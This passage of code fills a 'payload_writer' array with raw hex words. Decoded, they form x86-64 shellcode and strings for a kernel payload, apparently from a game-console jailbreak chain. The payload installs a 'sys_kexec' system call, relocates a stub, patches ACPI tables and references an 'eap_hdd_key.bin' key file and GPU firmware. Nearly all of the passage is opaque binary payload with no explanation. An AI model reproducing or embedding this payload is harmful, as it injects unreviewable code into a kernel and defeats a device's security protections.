  payload_writer[3515] = 0x220ffffe;
  payload_writer[3516] = 0x200fc3c2;
  payload_writer[3517] = 0x00e781c0;
  payload_writer[3518] = 0x48000100;
  payload_writer[3519] = 0x220fc709;
  payload_writer[3520] = 0x8b48c3c7;
  payload_writer[3521] = 0x000edb05;
  payload_writer[3522] = 0x89485300;
  payload_writer[3523] = 0xfb8948fe;
  payload_writer[3524] = 0xc931066a;
  payload_writer[3525] = 0x8b48006a;
  payload_writer[3526] = 0xc8834938;
  payload_writer[3527] = 0x0102baff;
  payload_writer[3528] = 0xb9410000;
  payload_writer[3529] = 0x00000001;
  payload_writer[3530] = 0x0ec615ff;
  payload_writer[3531] = 0x485a0000;
  payload_writer[3532] = 0x7559c085;
  payload_writer[3533] = 0xde894814;
  payload_writer[3534] = 0x3d3d8d48;
  payload_writer[3535] = 0xff00000b;
  payload_writer[3536] = 0x000e7715;
  payload_writer[3537] = 0xebc03100;
  payload_writer[3538] = 0x3d8b4817;
  payload_writer[3539] = 0x00000e9c;
  payload_writer[3540] = 0xffc68948;
  payload_writer[3541] = 0x000eab15;
  payload_writer[3542] = 0x050b4800;
  payload_writer[3543] = 0x00000e54;
  payload_writer[3544] = 0x8548c35b;
  payload_writer[3545] = 0xf28948ff;
  payload_writer[3546] = 0x8b481374;
  payload_writer[3547] = 0x000e7305;
  payload_writer[3548] = 0xfe894800;
  payload_writer[3549] = 0xff388b48;
  payload_writer[3550] = 0x000e7f25;
  payload_writer[3551] = 0x8548c300;
  payload_writer[3552] = 0xd1840ff6;
  payload_writer[3553] = 0x48000000;
  payload_writer[3554] = 0x840fff85;
  payload_writer[3555] = 0x000000c8;
  payload_writer[3556] = 0x53555441;
  payload_writer[3557] = 0x48fb8948;
  payload_writer[3558] = 0x4810ec83;
  payload_writer[3559] = 0xc031f289;
  payload_writer[3560] = 0x48f58948;
  payload_writer[3561] = 0x8d48fe89;
  payload_writer[3562] = 0x000aee3d;
  payload_writer[3563] = 0x0915ff00;
  payload_writer[3564] = 0x4800000e;
  payload_writer[3565] = 0x4378db85;
  payload_writer[3566] = 0xf93d8d48;
  payload_writer[3567] = 0x3100000a;
  payload_writer[3568] = 0xf515ffc0;
  payload_writer[3569] = 0x4800000d;
  payload_writer[3570] = 0x8d48de89;
  payload_writer[3571] = 0x000b1d3d;
  payload_writer[3572] = 0xffc03100;
  payload_writer[3573] = 0x000de315;
  payload_writer[3574] = 0x3d8d4800;
  payload_writer[3575] = 0x00000b30;
  payload_writer[3576] = 0x15ffc031;
  payload_writer[3577] = 0x00000dd4;
  payload_writer[3578] = 0x543d8d48;
  payload_writer[3579] = 0x3100000b;
  payload_writer[3580] = 0xc515ffc0;
  payload_writer[3581] = 0x3100000d;
  payload_writer[3582] = 0xff60ebc0;
  payload_writer[3583] = 0x000e1b15;
  payload_writer[3584] = 0xe8c03100;
  payload_writer[3585] = 0xfffffed9;
  payload_writer[3586] = 0x693d8d48;
  payload_writer[3587] = 0x4900000b;
  payload_writer[3588] = 0xc031c489;
  payload_writer[3589] = 0x0da215ff;
  payload_writer[3590] = 0x44c70000;
  payload_writer[3591] = 0x25ff0224;
  payload_writer[3592] = 0xc0310000;
  payload_writer[3593] = 0x2444c766;
  payload_writer[3594] = 0x48000006;
  payload_writer[3595] = 0x08245c89;
  payload_writer[3596] = 0x0204548a;
  payload_writer[3597] = 0x00055488;
  payload_writer[3598] = 0x48c0ff48;
  payload_writer[3599] = 0x750ef883;
  payload_writer[3600] = 0x4c090fef;
  payload_writer[3601] = 0xa7e8e789;
  payload_writer[3602] = 0xfffffffe;
  payload_writer[3603] = 0x000dd315;
  payload_writer[3604] = 0x0001b800;
  payload_writer[3605] = 0x03eb0000;
  payload_writer[3606] = 0x48c3c031;
  payload_writer[3607] = 0x5b10c483;
  payload_writer[3608] = 0xc35c415d;
  payload_writer[3609] = 0x53555441;
  payload_writer[3610] = 0x48df6348;
  payload_writer[3611] = 0x4830db6b;
  payload_writer[3612] = 0x8941f589;
  payload_writer[3613] = 0x1d0348d4;
  payload_writer[3614] = 0x00000d98;
  payload_writer[3615] = 0x0d9a15ff;
  payload_writer[3616] = 0xc0310000;
  payload_writer[3617] = 0xfffe58e8;
  payload_writer[3618] = 0xc6c931ff;
  payload_writer[3619] = 0x48000b04;
  payload_writer[3620] = 0x8348c1ff;
  payload_writer[3621] = 0xf37530f9;
  payload_writer[3622] = 0x48238944;
  payload_writer[3623] = 0x8948c789;
  payload_writer[3624] = 0x43c7086b;
  payload_writer[3625] = 0x0000012c;
  payload_writer[3626] = 0xfe44e800;
  payload_writer[3627] = 0x5d5bffff;
  payload_writer[3628] = 0x25ff5c41;
  payload_writer[3629] = 0x00000d6c;
  payload_writer[3630] = 0x81485441;
  payload_writer[3631] = 0xffc000e7;
  payload_writer[3632] = 0x485355ff;
  payload_writer[3633] = 0x3fff9e8d;
  payload_writer[3634] = 0x89410000;
  payload_writer[3635] = 0xfd8948d4;
  payload_writer[3636] = 0x00e38148;
  payload_writer[3637] = 0x89ffffc0;
  payload_writer[3638] = 0xfe8948d1;
  payload_writer[3639] = 0x48da8948;
  payload_writer[3640] = 0x0aaf3d8d;
  payload_writer[3641] = 0xc0310000;
  payload_writer[3642] = 0x0cce15ff;
  payload_writer[3643] = 0x0f410000;
  payload_writer[3644] = 0x8948ccb6;
  payload_writer[3645] = 0xee8948da;
  payload_writer[3646] = 0x3d8b485b;
  payload_writer[3647] = 0x00000cec;
  payload_writer[3648] = 0xff5c415d;
  payload_writer[3649] = 0x000d0325;
  payload_writer[3650] = 0xff854800;
  payload_writer[3651] = 0x74515355;
  payload_writer[3652] = 0x3d894807;
  payload_writer[3653] = 0x00000c74;
  payload_writer[3654] = 0x6d158b48;
  payload_writer[3655] = 0x4800000c;
  payload_writer[3656] = 0x0b74d285;
  payload_writer[3657] = 0x8a3d8d48;
  payload_writer[3658] = 0x3100000a;
  payload_writer[3659] = 0x48d2ffc0;
  payload_writer[3660] = 0x0c560d8b;
  payload_writer[3661] = 0xd2310000;
  payload_writer[3662] = 0x0fc98548;
  payload_writer[3663] = 0x0002a184;
  payload_writer[3664] = 0xb18d4800;
  payload_writer[3665] = 0xfff438d0;
  payload_writer[3666] = 0x3fffc6f7;
  payload_writer[3667] = 0x89480000;
  payload_writer[3668] = 0x000c5735;
  payload_writer[3669] = 0x48127400;
  payload_writer[3670] = 0x0a663d8d;
  payload_writer[3671] = 0xc0310000;
  payload_writer[3672] = 0xd231d1ff;
  payload_writer[3673] = 0x000279e9;
  payload_writer[3674] = 0x48c03100;
  payload_writer[3675] = 0x0a6e3d8d;
  payload_writer[3676] = 0xd1ff0000;
  payload_writer[3677] = 0x31058b48;
  payload_writer[3678] = 0x4800000c;
  payload_writer[3679] = 0x0c0a158b;
  payload_writer[3680] = 0xb08b0000;
  payload_writer[3681] = 0x022c525c;
  payload_writer[3682] = 0x5260808b;
  payload_writer[3683] = 0xc148022c;
  payload_writer[3684] = 0xc14827e6;
  payload_writer[3685] = 0x09481ee0;
  payload_writer[3686] = 0x00b848c6;
  payload_writer[3687] = 0x00000000;
  payload_writer[3688] = 0x48ffff80;
  payload_writer[3689] = 0x8548c609;
  payload_writer[3690] = 0x358948d2;
  payload_writer[3691] = 0x00000c04;
  payload_writer[3692] = 0x8d480b74;
  payload_writer[3693] = 0x000a3b3d;
  payload_writer[3694] = 0xffc03100;
  payload_writer[3695] = 0xfa5b9cd2;
  payload_writer[3696] = 0x1ae8c031;
  payload_writer[3697] = 0x48fffffd;
  payload_writer[3698] = 0x0c7205c7;
  payload_writer[3699] = 0x00000000;
  payload_writer[3700] = 0x89480000;
  payload_writer[3701] = 0x058b48c5;
  payload_writer[3702] = 0x00000bd0;
  payload_writer[3703] = 0x30908d48;
  payload_writer[3704] = 0x48000bc7;
  payload_writer[3705] = 0xca30888d;
  payload_writer[3706] = 0x8948000b;
  payload_writer[3707] = 0x000bcb15;
  payload_writer[3708] = 0x15894800;
  payload_writer[3709] = 0x00000b94;
  payload_writer[3710] = 0x30908d48;
  payload_writer[3711] = 0x480002f2;
  payload_writer[3712] = 0x0bc61589;
  payload_writer[3713] = 0x8d480000;
  payload_writer[3714] = 0x02f14090;
  payload_writer[3715] = 0x0d894800;
  payload_writer[3716] = 0x00000bb0;
  payload_writer[3717] = 0x90888d48;
  payload_writer[3718] = 0x48003298;
  payload_writer[3719] = 0x0bb21589;
  payload_writer[3720] = 0x8d480000;
  payload_writer[3721] = 0x02f6e090;
  payload_writer[3722] = 0x15894800;
  payload_writer[3723] = 0x00000bac;
  payload_writer[3724] = 0xe0908d48;
  payload_writer[3725] = 0x48021c8e;
  payload_writer[3726] = 0x0be60d89;
  payload_writer[3727] = 0x8d480000;
  payload_writer[3728] = 0x4447a088;
  payload_writer[3729] = 0x15894800;
  payload_writer[3730] = 0x00000b98;
  payload_writer[3731] = 0x68908d48;
  payload_writer[3732] = 0x48022c52;
  payload_writer[3733] = 0x0bd20d89;
  payload_writer[3734] = 0x8d480000;
  payload_writer[3735] = 0x44456088;
  payload_writer[3736] = 0x15894800;
  payload_writer[3737] = 0x00000b84;
  payload_writer[3738] = 0x80908d48;
  payload_writer[3739] = 0x48004307;
  payload_writer[3740] = 0x0bbe0d89;
  payload_writer[3741] = 0x8d480000;
  payload_writer[3742] = 0x3b2f8088;
  payload_writer[3743] = 0x15894800;
  payload_writer[3744] = 0x00000b70;
  payload_writer[3745] = 0xc0908d48;
  payload_writer[3746] = 0x48001172;
  payload_writer[3747] = 0x0baa0d89;
  payload_writer[3748] = 0x8d480000;
  payload_writer[3749] = 0x4ee3c088;
  payload_writer[3750] = 0x15894800;
  payload_writer[3751] = 0x00000b5c;
  payload_writer[3752] = 0x30908d48;
  payload_writer[3753] = 0x48003ded;
  payload_writer[3754] = 0x0b9e0d89;
  payload_writer[3755] = 0x8d480000;
  payload_writer[3756] = 0x4f683088;
  payload_writer[3757] = 0x15894800;
  payload_writer[3758] = 0x00000b48;
  payload_writer[3759] = 0xa0908d48;
  payload_writer[3760] = 0x48003e18;
  payload_writer[3761] = 0x0b8a0d89;
  payload_writer[3762] = 0x8d480000;
  payload_writer[3763] = 0x6e0cd088;
  payload_writer[3764] = 0x15894802;
  payload_writer[3765] = 0x00000b34;
  payload_writer[3766] = 0x60908d48;
  payload_writer[3767] = 0x48011256;
  payload_writer[3768] = 0x0b760d89;
  payload_writer[3769] = 0x8d480000;
  payload_writer[3770] = 0x7645e088;
  payload_writer[3771] = 0x15894802;
  payload_writer[3772] = 0x00000b20;
  payload_writer[3773] = 0x70908d48;
  payload_writer[3774] = 0x48003298;
  payload_writer[3775] = 0x0b620d89;
  payload_writer[3776] = 0x8d480000;
  payload_writer[3777] = 0x0decb088;
  payload_writer[3778] = 0x80054800;
  payload_writer[3779] = 0x48002cd7;
  payload_writer[3780] = 0x0b061589;
  payload_writer[3781] = 0x89480000;
  payload_writer[3782] = 0x000b4f0d;
  payload_writer[3783] = 0x05894800;
  payload_writer[3784] = 0x00000b50;
  payload_writer[3785] = 0x8b48d2ff;
  payload_writer[3786] = 0x000adf35;
  payload_writer[3787] = 0x0d8d4800;
  payload_writer[3788] = 0x000008d8;
  payload_writer[3789] = 0x00968d48;
  payload_writer[3790] = 0x48000005;
  payload_writer[3791] = 0x840fd639;
  payload_writer[3792] = 0x00000082;
  payload_writer[3793] = 0x8a40c031;
  payload_writer[3794] = 0x3840013c;
  payload_writer[3795] = 0x0574063c;
  payload_writer[3796] = 0xebc6ff48;
  payload_writer[3797] = 0xc0ff48e6;
  payload_writer[3798] = 0x06f88348;
  payload_writer[3799] = 0x46c6e875;
  payload_writer[3800] = 0x8d480005;
  payload_writer[3801] = 0x0008aa3d;
  payload_writer[3802] = 0xffc03100;
  payload_writer[3803] = 0x000a4b15;
  payload_writer[3804] = 0x07bafb00;
  payload_writer[3805] = 0x48000000;
  payload_writer[3806] = 0x0b06358d;
  payload_writer[3807] = 0x8d480000;
  payload_writer[3808] = 0xffe2673d;
  payload_writer[3809] = 0xfd2ee8ff;
  payload_writer[3810] = 0x48faffff;
  payload_writer[3811] = 0x08ae3d8d;
  payload_writer[3812] = 0xc0310000;
  payload_writer[3813] = 0x0a2215ff;
  payload_writer[3814] = 0x8d480000;
  payload_writer[3815] = 0x0008d53d;
  payload_writer[3816] = 0xd105c700;
  payload_writer[3817] = 0x0100000a;
  payload_writer[3818] = 0x31000000;
  payload_writer[3819] = 0x0915ffc0;
  payload_writer[3820] = 0x4800000a;
  payload_writer[3821] = 0x08c13d8d;
  payload_writer[3822] = 0xc0310000;
  payload_writer[3823] = 0x09fa15ff;
  payload_writer[3824] = 0xd2310000;
  payload_writer[3825] = 0x8d4812eb;
  payload_writer[3826] = 0x0008cc3d;
  payload_writer[3827] = 0xffc03100;
  payload_writer[3828] = 0x0009e715;
  payload_writer[3829] = 0xffca8300;
  payload_writer[3830] = 0xe8ef8948;
  payload_writer[3831] = 0xfffffb12;
  payload_writer[3832] = 0xd0899d53;
  payload_writer[3833] = 0xc35d5b5a;
  payload_writer[3834] = 0x00000079;
  payload_writer[3835] = 0x00000000;
  payload_writer[3836] = 0x00000000;
  payload_writer[3837] = 0x6ffffef5;
  payload_writer[3838] = 0x00000000;
  payload_writer[3839] = 0x00002708;
  payload_writer[3840] = 0x00000000;
  payload_writer[3841] = 0x00000005;
  payload_writer[3842] = 0x00000000;
  payload_writer[3843] = 0x00002700;
  payload_writer[3844] = 0x00000000;
  payload_writer[3845] = 0x00000006;
  payload_writer[3846] = 0x00000000;
  payload_writer[3847] = 0x000026e8;
  payload_writer[3848] = 0x00000000;
  payload_writer[3849] = 0x0000000a;
  payload_writer[3850] = 0x00000000;
  payload_writer[3851] = 0x00000001;
  payload_writer[3852] = 0x00000000;
  payload_writer[3853] = 0x0000000b;
  payload_writer[3854] = 0x00000000;
  payload_writer[3855] = 0x00000018;
  payload_writer[3856] = 0x00000000;
  payload_writer[3857] = 0x00000015;
  payload_writer[3858] = 0x00000000;
  payload_writer[3859] = 0x00000000;
  payload_writer[3860] = 0x00000000;
  payload_writer[3861] = 0x0000001e;
  payload_writer[3862] = 0x00000000;
  payload_writer[3863] = 0x00000008;
  payload_writer[3864] = 0x00000000;
  payload_writer[3865] = 0x6ffffffb;
  payload_writer[3866] = 0x00000000;
  payload_writer[3867] = 0x08000001;
  payload_writer[3868] = 0x00000000;
  payload_writer[3869] = 0x00000000;
  payload_writer[3870] = 0x00000000;
  payload_writer[3871] = 0x00000000;
  payload_writer[3872] = 0x00000000;
  payload_writer[3873] = 0x00000000;
  payload_writer[3874] = 0x00000000;
  payload_writer[3875] = 0x00000000;
  payload_writer[3876] = 0x00000000;
  payload_writer[3877] = 0x00000000;
  payload_writer[3878] = 0x00000000;
  payload_writer[3879] = 0x00000000;
  payload_writer[3880] = 0x00000000;
  payload_writer[3881] = 0x00000000;
  payload_writer[3882] = 0x00000000;
  payload_writer[3883] = 0x00000000;
  payload_writer[3884] = 0x00000000;
  payload_writer[3885] = 0x00000000;
  payload_writer[3886] = 0x00000000;
  payload_writer[3887] = 0x00000000;
  payload_writer[3888] = 0x00000000;
  payload_writer[3889] = 0x00000000;
  payload_writer[3890] = 0x00000000;
  payload_writer[3891] = 0x00000000;
  payload_writer[3892] = 0x00000000;
  payload_writer[3893] = 0x5f737973;
  payload_writer[3894] = 0x6578656b;
  payload_writer[3895] = 0x6e692063;
  payload_writer[3896] = 0x656b6f76;
  payload_writer[3897] = 0x73000a64;
  payload_writer[3898] = 0x6b5f7379;
  payload_writer[3899] = 0x63657865;
  payload_writer[3900] = 0x2c702528;
  payload_writer[3901] = 0x757a2520;
  payload_writer[3902] = 0x7025202c;
  payload_writer[3903] = 0x7a25202c;
  payload_writer[3904] = 0x22202c75;
  payload_writer[3905] = 0x29227325;
  payload_writer[3906] = 0x6146000a;
  payload_writer[3907] = 0x64656c69;
  payload_writer[3908] = 0x206f7420;
  payload_writer[3909] = 0x6f6c6c61;
  payload_writer[3910] = 0x65746163;
  payload_writer[3911] = 0x616d6920;
  payload_writer[3912] = 0x000a6567;
  payload_writer[3913] = 0x6c696146;
  payload_writer[3914] = 0x74206465;
  payload_writer[3915] = 0x6f63206f;
  payload_writer[3916] = 0x69207970;
  payload_writer[3917] = 0x6d69206e;
  payload_writer[3918] = 0x0a656761;
  payload_writer[3919] = 0x69614600;
  payload_writer[3920] = 0x2064656c;
  payload_writer[3921] = 0x61206f74;
  payload_writer[3922] = 0x636f6c6c;
  payload_writer[3923] = 0x20657461;
  payload_writer[3924] = 0x74696e69;
  payload_writer[3925] = 0x666d6172;
  payload_writer[3926] = 0x46000a73;
  payload_writer[3927] = 0x656c6961;
  payload_writer[3928] = 0x6f742064;
  payload_writer[3929] = 0x74786520;
  payload_writer[3930] = 0x74636172;
  payload_writer[3931] = 0x55504720;
  payload_writer[3932] = 0x72696620;
  payload_writer[3933] = 0x7261776d;
  payload_writer[3934] = 0x202d2065;
  payload_writer[3935] = 0x746e6f63;
  payload_writer[3936] = 0x69756e69;
  payload_writer[3937] = 0x6120676e;
  payload_writer[3938] = 0x6177796e;
  payload_writer[3939] = 0x46000a79;
  payload_writer[3940] = 0x656c6961;
  payload_writer[3941] = 0x6f742064;
  payload_writer[3942] = 0x706f6320;
  payload_writer[3943] = 0x6e692079;
  payload_writer[3944] = 0x696e6920;
  payload_writer[3945] = 0x6d617274;
  payload_writer[3946] = 0x000a7366;
  payload_writer[3947] = 0x6c696146;
  payload_writer[3948] = 0x74206465;
  payload_writer[3949] = 0x6c61206f;
  payload_writer[3950] = 0x61636f6c;
  payload_writer[3951] = 0x63206574;
  payload_writer[3952] = 0x696c646d;
  payload_writer[3953] = 0x000a656e;
  payload_writer[3954] = 0x6c696146;
  payload_writer[3955] = 0x74206465;
  payload_writer[3956] = 0x6f63206f;
  payload_writer[3957] = 0x69207970;
  payload_writer[3958] = 0x6d63206e;
  payload_writer[3959] = 0x6e696c64;
  payload_writer[3960] = 0x0a000a65;
  payload_writer[3961] = 0x6578656b;
  payload_writer[3962] = 0x61702063;
  payload_writer[3963] = 0x656d6172;
  payload_writer[3964] = 0x73726574;
  payload_writer[3965] = 0x20000a3a;
  payload_writer[3966] = 0x4b202020;
  payload_writer[3967] = 0x656e7265;
  payload_writer[3968] = 0x6d69206c;
  payload_writer[3969] = 0x20656761;
  payload_writer[3970] = 0x657a6973;
  payload_writer[3971] = 0x2020203a;
  payload_writer[3972] = 0x20757a25;
  payload_writer[3973] = 0x65747962;
  payload_writer[3974] = 0x20000a73;
  payload_writer[3975] = 0x49202020;
  payload_writer[3976] = 0x7274696e;
  payload_writer[3977] = 0x73666d61;
  payload_writer[3978] = 0x7a697320;
  payload_writer[3979] = 0x20203a65;
  payload_writer[3980] = 0x20202020;
  payload_writer[3981] = 0x20757a25;
  payload_writer[3982] = 0x65747962;
  payload_writer[3983] = 0x25282073;
  payload_writer[3984] = 0x6620757a;
  payload_writer[3985] = 0x206d6f72;
  payload_writer[3986] = 0x72657375;
  payload_writer[3987] = 0x20000a29;
  payload_writer[3988] = 0x4b202020;
  payload_writer[3989] = 0x656e7265;
  payload_writer[3990] = 0x6f63206c;
  payload_writer[3991] = 0x6e616d6d;
  payload_writer[3992] = 0x696c2064;
  payload_writer[3993] = 0x203a656e;
  payload_writer[3994] = 0x000a7325;
  payload_writer[3995] = 0x20202020;
  payload_writer[3996] = 0x6e72654b;
  payload_writer[3997] = 0x69206c65;
  payload_writer[3998] = 0x6567616d;
  payload_writer[3999] = 0x66756220;
  payload_writer[4000] = 0x3a726566;
  payload_writer[4001] = 0x0a702520;
  payload_writer[4002] = 0x20202000;
  payload_writer[4003] = 0x696e4920;
  payload_writer[4004] = 0x6d617274;
  payload_writer[4005] = 0x62207366;
  payload_writer[4006] = 0x65666675;
  payload_writer[4007] = 0x20203a72;
  payload_writer[4008] = 0x70252020;
  payload_writer[4009] = 0x6146000a;
  payload_writer[4010] = 0x64656c69;
  payload_writer[4011] = 0x206f7420;
  payload_writer[4012] = 0x6f6c6c61;
  payload_writer[4013] = 0x65746163;
  payload_writer[4014] = 0x0a706220;
  payload_writer[4015] = 0x69614600;
  payload_writer[4016] = 0x2064656c;
  payload_writer[4017] = 0x69206f74;
  payload_writer[4018] = 0x6174736e;
  payload_writer[4019] = 0x73206c6c;
  payload_writer[4020] = 0x64747568;
  payload_writer[4021] = 0x206e776f;
  payload_writer[4022] = 0x6b6f6f68;
  payload_writer[4023] = 0x2a2a000a;
  payload_writer[4024] = 0x2a2a2a2a;
  payload_writer[4025] = 0x2a2a2a2a;
  payload_writer[4026] = 0x2a2a2a2a;
  payload_writer[4027] = 0x2a2a2a2a;
  payload_writer[4028] = 0x2a2a2a2a;
  payload_writer[4029] = 0x2a2a2a2a;
  payload_writer[4030] = 0x2a2a2a2a;
  payload_writer[4031] = 0x2a2a2a2a;
  payload_writer[4032] = 0x2a2a2a2a;
  payload_writer[4033] = 0x2a2a2a2a;
  payload_writer[4034] = 0x2a2a2a2a;
  payload_writer[4035] = 0x2a2a2a2a;
  payload_writer[4036] = 0x2a2a2a2a;
  payload_writer[4037] = 0x656b000a;
  payload_writer[4038] = 0x20636578;
  payload_writer[4039] = 0x63637573;
  payload_writer[4040] = 0x66737365;
  payload_writer[4041] = 0x796c6c75;
  payload_writer[4042] = 0x6d726120;
  payload_writer[4043] = 0x202e6465;
  payload_writer[4044] = 0x61656c50;
  payload_writer[4045] = 0x73206573;
  payload_writer[4046] = 0x20747568;
  payload_writer[4047] = 0x6e776f64;
  payload_writer[4048] = 0x65687420;
  payload_writer[4049] = 0x73797320;
  payload_writer[4050] = 0x2e6d6574;
  payload_writer[4051] = 0x2a2a000a;
  payload_writer[4052] = 0x2a2a2a2a;
  payload_writer[4053] = 0x2a2a2a2a;
  payload_writer[4054] = 0x2a2a2a2a;
  payload_writer[4055] = 0x2a2a2a2a;
  payload_writer[4056] = 0x2a2a2a2a;
  payload_writer[4057] = 0x2a2a2a2a;
  payload_writer[4058] = 0x2a2a2a2a;
  payload_writer[4059] = 0x2a2a2a2a;
  payload_writer[4060] = 0x2a2a2a2a;
  payload_writer[4061] = 0x2a2a2a2a;
  payload_writer[4062] = 0x2a2a2a2a;
  payload_writer[4063] = 0x2a2a2a2a;
  payload_writer[4064] = 0x2a2a2a2a;
  payload_writer[4065] = 0x49000a0a;
  payload_writer[4066] = 0x6174736e;
  payload_writer[4067] = 0x6e696c6c;
  payload_writer[4068] = 0x79732067;
  payload_writer[4069] = 0x656b5f73;
  payload_writer[4070] = 0x20636578;
  payload_writer[4071] = 0x73206f74;
  payload_writer[4072] = 0x65747379;
  payload_writer[4073] = 0x6163206d;
  payload_writer[4074] = 0x23206c6c;
  payload_writer[4075] = 0x000a6425;
  payload_writer[4076] = 0x6578656b;
  payload_writer[4077] = 0x6e695f63;
  payload_writer[4078] = 0x29287469;
  payload_writer[4079] = 0x63757320;
  payload_writer[4080] = 0x73736563;
  payload_writer[4081] = 0x0a6c7566;
  payload_writer[4082] = 0x656b000a;
  payload_writer[4083] = 0x3a636578;
  payload_writer[4084] = 0x69615720;
  payload_writer[4085] = 0x676e6974;
  payload_writer[4086] = 0x726f6620;
  payload_writer[4087] = 0x63657320;
  payload_writer[4088] = 0x61646e6f;
  payload_writer[4089] = 0x43207972;
  payload_writer[4090] = 0x2e735550;
  payload_writer[4091] = 0x000a2e2e;
  payload_writer[4092] = 0x6578656b;
  payload_writer[4093] = 0x53203a63;
  payload_writer[4094] = 0x6e6f6365;
  payload_writer[4095] = 0x79726164;
  payload_writer[4096] = 0x55504320;
  payload_writer[4097] = 0x75712073;
  payload_writer[4098] = 0x63736569;
  payload_writer[4099] = 0x000a6465;
  payload_writer[4100] = 0x6578656b;
  payload_writer[4101] = 0x53203a63;
  payload_writer[4102] = 0x69747465;
  payload_writer[4103] = 0x7520676e;
  payload_writer[4104] = 0x44472070;
  payload_writer[4105] = 0x2e2e2e54;
  payload_writer[4106] = 0x656b000a;
  payload_writer[4107] = 0x3a636578;
  payload_writer[4108] = 0x6c655220;
  payload_writer[4109] = 0x7461636f;
  payload_writer[4110] = 0x20676e69;
  payload_writer[4111] = 0x62757473;
  payload_writer[4112] = 0x0a2e2e2e;
  payload_writer[4113] = 0x78656b00;
  payload_writer[4114] = 0x203a6365;
  payload_writer[4115] = 0x74746553;
  payload_writer[4116] = 0x20676e69;
  payload_writer[4117] = 0x62207075;
  payload_writer[4118] = 0x20746f6f;
  payload_writer[4119] = 0x61726170;
  payload_writer[4120] = 0x2e2e736d;
  payload_writer[4121] = 0x6b000a2e;
  payload_writer[4122] = 0x63657865;
  payload_writer[4123] = 0x6c43203a;
  payload_writer[4124] = 0x696e6165;
  payload_writer[4125] = 0x7520676e;
  payload_writer[4126] = 0x61682070;
  payload_writer[4127] = 0x61776472;
  payload_writer[4128] = 0x2e2e6572;
  payload_writer[4129] = 0x6b000a2e;
  payload_writer[4130] = 0x63657865;
  payload_writer[4131] = 0x6552203a;
  payload_writer[4132] = 0x666e6f63;
  payload_writer[4133] = 0x72756769;
  payload_writer[4134] = 0x20676e69;
  payload_writer[4135] = 0x4d415256;
  payload_writer[4136] = 0x0a2e2e2e;
  payload_writer[4137] = 0x78656b00;
  payload_writer[4138] = 0x203a6365;
  payload_writer[4139] = 0x65736552;
  payload_writer[4140] = 0x6e697474;
  payload_writer[4141] = 0x50472067;
  payload_writer[4142] = 0x2e2e2e55;
  payload_writer[4143] = 0x656b000a;
  payload_writer[4144] = 0x3a636578;
  payload_writer[4145] = 0x6f624120;
  payload_writer[4146] = 0x74207475;
  payload_writer[4147] = 0x6572206f;
  payload_writer[4148] = 0x61636f6c;
  payload_writer[4149] = 0x61206574;
  payload_writer[4150] = 0x6a20646e;
  payload_writer[4151] = 0x20706d75;
  payload_writer[4152] = 0x6b206f74;
  payload_writer[4153] = 0x656e7265;
  payload_writer[4154] = 0x6b000a6c;
  payload_writer[4155] = 0x63657865;
  payload_writer[4156] = 0x6e75203a;
  payload_writer[4157] = 0x63616572;
  payload_writer[4158] = 0x6c626168;
  payload_writer[4159] = 0x3f282065;
  payload_writer[4160] = 0x68000a29;
  payload_writer[4161] = 0x5f6b6f6f;
  payload_writer[4162] = 0x5f636369;
  payload_writer[4163] = 0x72657571;
  payload_writer[4164] = 0x6f6e5f79;
  payload_writer[4165] = 0x74696177;
  payload_writer[4166] = 0x6c616320;
  payload_writer[4167] = 0x0a64656c;
  payload_writer[4168] = 0x50434100;
  payload_writer[4169] = 0x61742049;
  payload_writer[4170] = 0x73656c62;
  payload_writer[4171] = 0x78696620;
  payload_writer[4172] = 0x000a6465;
  payload_writer[4173] = 0x6b6f6f68;
  payload_writer[4174] = 0x6363695f;
  payload_writer[4175] = 0x6575715f;
  payload_writer[4176] = 0x6e5f7972;
  payload_writer[4177] = 0x6961776f;
  payload_writer[4178] = 0x75203a74;
  payload_writer[4179] = 0x6165726e;
  payload_writer[4180] = 0x62616863;
  payload_writer[4181] = 0x2820656c;
  payload_writer[4182] = 0x000a293f;
  payload_writer[4183] = 0x37303730;
  payload_writer[4184] = 0x6b003130;
  payload_writer[4185] = 0x6b007965;
  payload_writer[4186] = 0x652f7965;
  payload_writer[4187] = 0x685f7061;
  payload_writer[4188] = 0x6b5f6464;
  payload_writer[4189] = 0x622e7965;
  payload_writer[4190] = 0x6c006e69;
  payload_writer[4191] = 0x6c006269;
  payload_writer[4192] = 0x662f6269;
  payload_writer[4193] = 0x776d7269;
  payload_writer[4194] = 0x00657261;
  payload_writer[4195] = 0x2f62696c;
  payload_writer[4196] = 0x6d726966;
  payload_writer[4197] = 0x65726177;
  payload_writer[4198] = 0x6964652f;
  payload_writer[4199] = 0x696c0064;
  payload_writer[4200] = 0x69662f62;
  payload_writer[4201] = 0x61776d72;
  payload_writer[4202] = 0x652f6572;
  payload_writer[4203] = 0x2f646964;
  payload_writer[4204] = 0x30323931;
  payload_writer[4205] = 0x38303178;
  payload_writer[4206] = 0x69622e30;
  payload_writer[4207] = 0x6966006e;
  payload_writer[4208] = 0x61776d72;
  payload_writer[4209] = 0x655f6572;
  payload_writer[4210] = 0x61727478;
  payload_writer[4211] = 0x203a7463;
  payload_writer[4212] = 0x7265766f;
  payload_writer[4213] = 0x776f6c66;
  payload_writer[4214] = 0x64252021;
  payload_writer[4215] = 0x25203e20;
  payload_writer[4216] = 0x46000a64;
  payload_writer[4217] = 0x6e697869;
  payload_writer[4218] = 0x43412067;
  payload_writer[4219] = 0x74204950;
  payload_writer[4220] = 0x656c6261;
  payload_writer[4221] = 0x74612073;
  payload_writer[4222] = 0x25783020;
  payload_writer[4223] = 0x20786c6c;
  payload_writer[4224] = 0x29702528;
  payload_writer[4225] = 0x5352000a;
  payload_writer[4226] = 0x61205444;
  payload_writer[4227] = 0x78302074;
  payload_writer[4228] = 0x000a7825;
  payload_writer[4229] = 0x54445358;
  payload_writer[4230] = 0x20746120;
  payload_writer[4231] = 0x6c257830;
  payload_writer[4232] = 0x000a786c;
  payload_writer[4233] = 0x63256325;
  payload_writer[4234] = 0x63256325;
  payload_writer[4235] = 0x20746120;
  payload_writer[4236] = 0x78257830;
  payload_writer[4237] = 0x4146000a;
  payload_writer[4238] = 0x61205343;
  payload_writer[4239] = 0x78302074;
  payload_writer[4240] = 0x000a7825;
  payload_writer[4241] = 0x54445344;
  payload_writer[4242] = 0x20746120;
  payload_writer[4243] = 0x78257830;
  payload_writer[4244] = 0x5245000a;
  payload_writer[4245] = 0x3a524f52;
  payload_writer[4246] = 0x206f6e20;
  payload_writer[4247] = 0x54444146;
  payload_writer[4248] = 0x74657920;
  payload_writer[4249] = 0x46000a3f;
  payload_writer[4250] = 0x20204630;
  payload_writer[4251] = 0x53500020;
